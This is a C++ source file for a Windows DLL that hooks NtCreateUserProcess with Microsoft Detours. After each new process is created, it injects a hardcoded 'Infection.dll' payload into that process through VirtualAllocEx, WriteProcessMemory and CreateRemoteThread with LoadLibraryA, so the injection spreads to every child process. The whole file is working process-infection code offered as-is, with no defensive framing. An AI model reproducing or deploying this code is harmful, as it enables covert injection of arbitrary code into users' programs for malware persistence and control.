// dllmain.cpp : Defines the entry point for the DLL application.
// http://www.rohitab.com/discuss/topic/40191-ntcreateuserprocess/
// https://gist.github.com/apsun/1adb6557a44ea8372e7cc27c3ad827ad
#include "pch.h"
#include<windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <winternl.h>
#include "detours.h"
#include "import.h"
#include <system_error>
#include <shlwapi.h>


#pragma comment(lib,"detours.lib")
#pragma comment(lib,"Shlwapi.lib")

const char* payload = "C:\\Users\\ThunderCracker\\Desktop\\Hijack\\Process-Infection\\x64\\Debug\\Infection.dll";

typedef NTSTATUS(NTAPI* realNtCreateUserProcess)
(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags,
    ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo,
    PPS_ATTRIBUTE_LIST AttributeList
    );

realNtCreateUserProcess originalNtCreateUserProcess = (realNtCreateUserProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),
    "NtCreateUserProcess");

DWORD WINAPI createMessageBox(LPCWSTR lpParam) {
    MessageBox(NULL, lpParam, L"Dll says:", MB_OK);
    return 0;
}

DWORD getProcessIDByName(PRTL_USER_PROCESS_PARAMETERS processParameters) {

    DWORD pid = 0;
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(PROCESSENTRY32);

    char buffer[100];

    if (Process32First(snapshot, &process)) {

        do {

            PathStripPathW(&processParameters->ImagePathName.Buffer[0]);

            if (wcscmp(process.szExeFile, &processParameters->ImagePathName.Buffer[0]) == 0)
            {
                DWORD tPid = process.th32ProcessID;

                if (pid < tPid) {
                    pid = tPid;
                }

            }
        } while (Process32Next(snapshot, &process));

    }

    return pid;
}

NTSTATUS WINAPI  _NtCreateUserProcess
(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags,
    ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo,
    PPS_ATTRIBUTE_LIST AttributeList
)
{
    char buffer[100];

    NTSTATUS status = originalNtCreateUserProcess(ProcessHandle, ThreadHandle, ProcessDesiredAccess, ThreadDesiredAccess, ProcessObjectAttributes, ThreadObjectAttributes, ProcessFlags, ThreadFlags, ProcessParameters, CreateInfo, AttributeList);

    if (status == ERROR_SUCCESS) {

        DWORD pid = getProcessIDByName(ProcessParameters);
        sprintf_s(buffer, "pid: %d\n", pid);
        OutputDebugStringA(buffer);

        if (pid != 0) {
            HANDLE processHandle = OpenProcess(
                PROCESS_CREATE_THREAD | // For CreateRemoteThread
                PROCESS_VM_OPERATION | // For VirtualAllocEx/VirtualFreeEx
                PROCESS_VM_WRITE,       // For WriteProcessMemory
                FALSE,                  // Don't inherit handles
                pid);            // PID of our target process It was originally published on https://www.apriorit.com/

            LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
            LPVOID dereercomp = VirtualAllocEx(processHandle, NULL, strlen(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            WriteProcessMemory(processHandle, dereercomp, payload, strlen(payload), NULL);
            HANDLE asdc = CreateRemoteThread(processHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);;
        }

    }

    return status;
}


void attachDetour() {

    DetourRestoreAfterWith();
    DetourTransactionBegin();

    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&originalNtCreateUserProcess, _NtCreateUserProcess);

    DetourTransactionCommit();
}

void deAttachDetour() {

    DetourTransactionBegin();

    DetourUpdateThread(GetCurrentThread());

    DetourDetach((PVOID*)&originalNtCreateUserProcess, _NtCreateUserProcess);

    DetourTransactionCommit();
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        attachDetour();
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetour();
        break;
    }
    return TRUE;
}
